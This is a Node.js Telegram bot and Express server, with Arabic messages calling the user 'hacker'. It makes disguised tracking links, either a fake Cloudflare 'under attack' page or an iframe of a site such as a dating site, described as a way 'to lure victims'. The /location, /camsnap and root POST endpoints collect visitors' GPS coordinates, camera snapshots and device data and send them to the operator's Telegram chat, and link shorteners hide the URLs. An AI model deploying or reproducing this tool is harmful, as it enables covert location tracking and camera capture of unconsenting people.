const mySecret = process.env['bot']
const fs = require("fs");
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(process.env["bot"], {polling: true});
var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

//Modify your URL here
var hostURL="Link";
//TOGGLE for 1pt Proxy and Shorters
var use1pt=true;



app.get("/w/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
  
if(req.params.path != null){
res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} 
else{
res.redirect("https://t.me/Driving_uncle_personally");
}

         
                              
});

app.get("/c/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}


if(req.params.path != null){
res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} 
else{
res.redirect("https://t.me/Driving_uncle_personally");
}

         
                              
});



bot.on('message', async (msg) => {
const chatId = msg.chat.id;

 

if(msg?.reply_to_message?.text=="🌐 Enter Your URL"){
 createLink(chatId,msg.text); 
}
  
if(msg.text=="/start"){
var m={
reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
};

bot.sendMessage(chatId, `مرحباً عزيزي الهكر ${msg.chat.first_name} ! , \nيمكنك استخدام هذا البوت لتعقب الأشخاص فقط من خلال رابط بسيط.
يمكنه جمع معلومات مثل الموقع ومعلومات الجهاز ولقطات الكاميرا 
مطور ومبرمج بحتراف من قبل القياده الخال شخصياً 🦅🇾🇪
اذا وقف معك البوت تواصل مع المطور ☟
@TheYemenigentle 
----------------------------------------------------------------
ملاحظه ⚠️
للمزيد من المساعده ارسل كلمة /help.
الحقوق محفوظه لدى قناة @Termux7.`,m);
}
else if(msg.text=="/create"){
createNew(chatId);
}
else if(msg.text=="/help"){
bot.sendMessage(chatId,` مرحباً عزيزي الهكر 
برمجة اخلاقيه وقانونيه 
لا تستخدم البوت فيما يغضب الله
مثل ما ستوقع غيرك اعرف انك ستقع انت بنفسك
لا تحاول اسقاط الجميع لتسقط
البوت يعمل بذكاء خارق ✅
مطور من قبل القياده الخال شخصياً 🦅🇾🇪

من خلال هذا البوت ، يمكنك تتبع الأشخاص فقط عن طريق إرسال رابط بسيط.

إرسل /create
للبدء ، سيطلب منك بعد ذلك عنوان URL الذي سيتم استخدامه في iframe لجذب الضحايا.
بعد الاستلام
عنوان url سيرسل لك رابطين يمكنك استخدامهما لتتبع الأشخاص.


تحديد.

1. ارتباط Cloudflare: ستُظهر هذه الطريقة صفحة Cloudflare تحت الهجوم لجمع المعلومات وبعد ذلك سيتم إعادة توجيه الضحية إلى عنوان URL المقصود.

2. رابط عرض الويب: سيعرض هذا موقع الويب (مثل bing ومواقع المواعدة وما إلى ذلك) باستخدام iframe لجمع المعلومات.
(⚠️ قد لا تعمل العديد من المواقع بموجب هذه الطريقة إذا كان لديها رأس إطار x موجود. مثال https://google.com)

تم برجمة البوت من الغه الانجليزيه الى الغه العربيه بواسطة القياده الخال شخصياً
معرف قناة المطور الرسميه 
@Driving_uncle_personally
@Driving_uncle_personally )


الحقوق محفوظه لدى قناة المطور: 
@Driving_uncle_personally
سيتم تنزيل اهم ادوات الاختراق الاكثر خطوره 
على قناة اخوي العراقي 
رابط القناه 
@Termux7
@Termux7
`);
}
  
  
});

bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
bot.answerCallbackQuery(callbackQuery.id);
if(callbackQuery.data=="crenew"){
createNew(callbackQuery.message.chat.id);
} 
});
bot.on('polling_error', (error) => {
//console.log(error.code); 
});






async function createLink(cid,msg){

var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1 ) && !encoded) {
 
var url=cid.toString(36)+'/'+btoa(msg);
var m={
  reply_markup:JSON.stringify({
    "inline_keyboard":[[{text:"Create new Link",callback_data:"crenew"}]]
  } )
};

var cUrl=`${hostURL}/c/${url}`;
var wUrl=`${hostURL}/w/${url}`;
  
bot.sendChatAction(cid,"typing");
if(use1pt){
var x=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
var y=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());

var f="",g="";

for(var c in x){
f+=x[c]+"\n";
}

for(var c in y){
g+=y[c]+"\n";
}
  
bot.sendMessage(cid, `تم صنع الروابط من قبل بوت الاختراق ☠ من خلال الرابط الخاص بك الذي ارسلته للبوت ☠ مطور البوت القياده الخال شخصياً🦅🇾🇪.\nالرابط الخاص بك الذي كتبته: ${msg}\n\n✅تم صنع الروابط من قبل بوت الخال\n\n🌐 اول ثلاثه روابط تم صنعهم من قبل بوت القياده الخال 👇 \n${f}\n\n🌐 ثاني ثلاثه روابط الذي تم صنعهم من قبل بوت القياده الخال 👇\n${g}`,m);
}
else{

bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
}
}
else{
bot.sendMessage(cid,`⚠️ الرابط غلط❌ عيد كتابة الرابط بشكل صحيح كمثال اول شي اكتب هيك 👇
https:// بعد كتابة هذا اكتب اي احرف انجليزي لصنع رابط خاص بك
الحقوق محفوظه لدى قناة مطور البوت 👇
@Driving_uncle_personally.`);
createNew(cid);

}  
}


function createNew(cid){
var mk={
reply_markup:JSON.stringify({"force_reply":true})
};
bot.sendMessage(cid,`🌐 Enter Your URL`,mk);
}





app.get("/", (req, res) => {
var ip;
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
res.json({"ip":ip});

  
});


app.post("/location",(req,res)=>{

  
var lat=parseFloat(decodeURIComponent(req.body.lat)) || null;
var lon=parseFloat(decodeURIComponent(req.body.lon)) || null;
var uid=decodeURIComponent(req.body.uid) || null;
var acc=decodeURIComponent(req.body.acc) || null;
if(lon != null && lat != null && uid != null && acc != null){

bot.sendLocation(parseInt(uid,36),lat,lon);

bot.sendMessage(parseInt(uid,36),`Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
  
res.send("Done");
}
});


app.post("/",(req,res)=>{

var uid=decodeURIComponent(req.body.uid) || null;
var data=decodeURIComponent(req.body.data)  || null; 
if( uid != null && data != null){


data=data.replaceAll("<br>","\n");

bot.sendMessage(parseInt(uid,36),data,{parse_mode:"HTML"});

  
res.send("Done");
}
});


app.post("/camsnap",(req,res)=>{
var uid=decodeURIComponent(req.body.uid)  || null;
var img=decodeURIComponent(req.body.img) || null;
  
if( uid != null && img != null){
  
var buffer=Buffer.from(img,'base64');
  
var info={
filename:"camsnap.png",
contentType: 'image/png'
};


try {
bot.sendPhoto(parseInt(uid,36),buffer,{},info);
} catch (error) {
console.log(error);
}


res.send("Done");
 
}

});



app.listen(5000, () => {
console.log("App Running on Port 5000!");
});
db.list("prefix").then(matches => {})
